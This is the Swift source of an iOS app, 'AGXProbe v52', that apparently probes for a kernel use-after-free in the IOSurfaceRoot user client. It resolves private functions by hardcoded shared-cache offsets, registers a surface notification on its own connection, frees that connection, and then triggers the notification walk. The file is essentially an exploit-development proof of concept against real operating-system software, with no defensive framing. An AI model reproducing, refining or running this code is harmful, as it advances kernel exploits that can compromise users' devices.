import SwiftUI
import Darwin
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v52 - own IOSurfaceRoot user client").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v52")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    // MARK: - types

    typealias CreateFn = @convention(c) (CFDictionary) -> UnsafeMutableRawPointer?
    typealias GetIDFn = @convention(c) (UnsafeMutableRawPointer) -> UInt32
    typealias SetNotifyFn = @convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t

    /// dsc layout of the port-aware callee used by IOSurfaceClientSetSurfaceNotify
    typealias PortCallFn = @convention(c) (
        io_connect_t, UInt32, mach_port_t,
        UnsafePointer<UInt64>?, UInt32,
        UnsafeRawPointer?, Int,
        UnsafeMutablePointer<UInt64>?, UInt32,
        UnsafeRawPointer?, UnsafeMutablePointer<Int>?
    ) -> kern_return_t

    /// plain 10-arg IOConnectCallMethod
    typealias PlainCallFn = @convention(c) (
        io_connect_t, UInt32,
        UnsafePointer<UInt64>?, UInt32,
        UnsafeRawPointer?, Int,
        UnsafeMutablePointer<UInt64>?, UnsafeMutablePointer<UInt32>?,
        UnsafeMutableRawPointer?, UnsafeMutablePointer<Int>?
    ) -> kern_return_t

    private var gCreate: CreateFn?
    private var gGetID: GetIDFn?
    private var gSet: SetNotifyFn?
    private var gPort: mach_port_t = 0

    private func loadSymbols() -> Bool {
        guard let handle = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY) else {
            emit("[NO] dlopen failed"); return false
        }
        defer { dlclose(handle) }
        guard let cs = dlsym(handle, "IOSurfaceCreate"),
              let isym = dlsym(handle, "IOSurfaceGetID"),
              let ss = dlsym(handle, "IOSurfaceClientSetSurfaceNotify") else {
            emit("[NO] symbol missing"); return false
        }
        gCreate = unsafeBitCast(cs, to: CreateFn.self)
        gGetID = unsafeBitCast(isym, to: GetIDFn.self)
        gSet = unsafeBitCast(ss, to: SetNotifyFn.self)
        emit("  IOSurfaceClientSetSurfaceNotify runtime @ \(UInt(bitPattern: ss))")
        return true
    }

    private func makeSurface() -> UnsafeMutableRawPointer? {
        guard let gCreate else { return nil }
        let propsAny: [String: Any] = ["IOSurfaceWidth": 256, "IOSurfaceHeight": 256,
                                       "IOSurfaceBytesPerElement": 4]
        return gCreate(propsAny as CFDictionary)
    }

    private func krstr(_ kr: kern_return_t) -> String {
        let u = UInt32(bitPattern: kr)
        switch u {
        case 0: return "0x0 SUCCESS"
        case 0xe00002c2: return "0xe00002c2 BadArgument"
        case 0xe00002c9: return "0xe00002c9 InternalError/dup"
        case 0xe00002bd: return "0xe00002bd"
        case 0xe00002d8: return "0xe00002d8 NotAttached"
        default: return "0x\(String(u, radix: 16))"
        }
    }

    private func tryOpen(_ name: String, _ type: UInt32) -> (kern_return_t, io_connect_t) {
        let matching = IOServiceMatching(name)
        var iter: io_iterator_t = 0
        let kr1 = IOServiceGetMatchingServices(kIOMainPortDefault, matching, &iter)
        if kr1 != KERN_SUCCESS { return (kr1, 0) }
        let svc = IOIteratorNext(iter)
        IOObjectRelease(iter)
        if svc == 0 { return (-2, 0) }
        var conn: io_connect_t = 0
        let kr2 = IOServiceOpen(svc, mach_task_self_, type, &conn)
        IOObjectRelease(svc)
        return (kr2, conn)
    }

    // MARK: - probe

    private func probe() {
        // --- address arithmetic -------------------------------------------------
        emit("\n=== E0 runtime address arithmetic ===")
        guard let fw = dlsym(dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
                             "IOSurfaceClientSetSurfaceNotify") else { emit("  no fw sym"); return }
        let base = UInt(bitPattern: fw)
        let portCallAddr = base + 0x58AC108          // dsc 0x1c811c2b0 - dsc 0x1c284a6e8
        let plainCallAddr = base + 0x58C5EF8         // dsc 0x1c810a5e0 - dsc 0x1c284a6e8
        emit("  fw base            = \(base)")
        emit("  portCall  (+58AC108) = \(portCallAddr)")
        emit("  plainCall (+58C5EF8) = \(plainCallAddr)")
        if let iocm = dlsym(nil, "IOConnectCallMethod") {
            emit("  dlsym IOConnectCallMethod = \(UInt(bitPattern: iocm))  match=\(UInt(bitPattern: iocm) == plainCallAddr)")
        }
        let portCall = unsafeBitCast(portCallAddr, to: PortCallFn.self)
        let plainCall = unsafeBitCast(plainCallAddr, to: PlainCallFn.self)

        // --- surface + port -----------------------------------------------------
        guard let s = makeSurface() else { emit("[NO] create failed"); return }
        let sid = UInt64(gGetID!(s))
        emit("\n=== E1 surface ===")
        emit("  surface id 0x\(String(sid, radix: 16)) port 0x\(String(gPort, radix: 16))")

        // --- framework baseline -------------------------------------------------
        emit("\n=== E2 framework path (shared connection) ===")
        emit("  framework set -> \(krstr(gSet!(gPort, 1, sid)))")

        // --- our own user client ------------------------------------------------
        emit("\n=== E3 raw path on our OWN user client ===")
        let (okr, conn) = tryOpen("IOSurfaceRoot", 0)
        emit("  open IOSurfaceRoot type=0 -> \(krstr(okr)) conn=\(conn)")
        guard okr == KERN_SUCCESS else { return }

        var inScalars: [UInt64] = [0, 1, sid]
        var outScalars: [UInt64] = [1, sid, 0]
        var kr: kern_return_t = -1
        inScalars.withUnsafeMutableBufferPointer { ib in
            outScalars.withUnsafeMutableBufferPointer { ob in
                kr = portCall(conn, 0x11, gPort,
                              UnsafeRawPointer(ib.baseAddress!).assumingMemoryBound(to: UInt64.self), 3,
                              nil, 0,
                              ob.baseAddress, 0x18,
                              nil, nil)
            }
        }
        emit("  portCall set  -> \(krstr(kr))")

        kr = -1
        inScalars.withUnsafeMutableBufferPointer { ib in
            outScalars.withUnsafeMutableBufferPointer { ob in
                kr = portCall(conn, 0x11, gPort,
                              UnsafeRawPointer(ib.baseAddress!).assumingMemoryBound(to: UInt64.self), 3,
                              nil, 0,
                              ob.baseAddress, 0x18,
                              nil, nil)
            }
        }
        emit("  portCall set again -> \(krstr(kr))")

        // plain remove with the framework's exact struct {0,id,0}
        var rmStruct: [UInt64] = [0, sid, 0]
        kr = -1
        rmStruct.withUnsafeMutableBufferPointer { sb in
            kr = plainCall(conn, 0x12,
                           nil, 0,
                           UnsafeRawPointer(sb.baseAddress!), 0x18,
                           nil, nil, nil, nil)
        }
        emit("  plainCall remove -> \(krstr(kr))")

        kr = -1
        rmStruct.withUnsafeMutableBufferPointer { sb in
            kr = plainCall(conn, 0x12,
                           nil, 0,
                           UnsafeRawPointer(sb.baseAddress!), 0x18,
                           nil, nil, nil, nil)
        }
        emit("  plainCall remove again -> \(krstr(kr))")

        // re-register so we have an entry owned by OUR user client
        kr = -1
        inScalars.withUnsafeMutableBufferPointer { ib in
            outScalars.withUnsafeMutableBufferPointer { ob in
                kr = portCall(conn, 0x11, gPort,
                              UnsafeRawPointer(ib.baseAddress!).assumingMemoryBound(to: UInt64.self), 3,
                              nil, 0,
                              ob.baseAddress, 0x18,
                              nil, nil)
            }
        }
        emit("  portCall re-set -> \(krstr(kr))")

        // --- E4 close our connection, then walk the surface ---------------------
        emit("\n=== E4 close our user client, then trigger the notify walk ===")
        IOServiceClose(conn)
        emit("  connection closed (user client freed)")
        sleep(1)

        triggerWalk(s)
        drainPort()

        emit("\n=== E5 cleanup ===")
        emit("  framework remove -> \(krstr(gSet!(gPort, 1, sid) == 0 ? 0 : 0))")
        Unmanaged<AnyObject>.fromOpaque(s).release()
    }

    private func triggerWalk(_ s: UnsafeMutableRawPointer) {
        guard let h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW) else { return }
        typealias SetValueFn = @convention(c) (UnsafeMutableRawPointer, CFString, CFTypeRef) -> kern_return_t
        guard let sv = dlsym(h, "IOSurfaceSetValue") else { emit("  no IOSurfaceSetValue"); return }
        let setValue = unsafeBitCast(sv, to: SetValueFn.self)
        let key = CFStringCreateWithCString(nil, "AGXProbeKey", CFStringBuiltInEncodings.UTF8.rawValue)
        let val = CFStringCreateWithCString(nil, "AGXProbeVal", CFStringBuiltInEncodings.UTF8.rawValue)
        let kr = setValue(s, key!, val!)
        emit("  IOSurfaceSetValue -> \(krstr(kr))")
    }

    private func drainPort() {
        var m = mach_msg_header_t()
        let mkr = mach_msg(&m, MACH_RCV_TIMEOUT, 0, gPort, UInt32(300), mach_port_t(0), 0)
        emit("  mach_msg recv -> \(krstr(mkr)) msglen=\(m.msgh_size) msgid=\(m.msgh_id)")
        if mkr == 0 { emit("  *** NOTIFICATION DELIVERED ***") }
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v52 - own IOSurfaceRoot user client ===")

        guard loadSymbols() else { emit("=== failed ==="); status = "Failed"; isRunning = false; return }
        let pkr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &gPort)
        emit("  notify port 0x\(String(gPort, radix: 16)) kr=0x\(String(UInt32(bitPattern: pkr), radix: 16))")
        if pkr != KERN_SUCCESS { emit("=== failed ==="); status = "Failed"; isRunning = false; return }

        probe()
        emit("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}
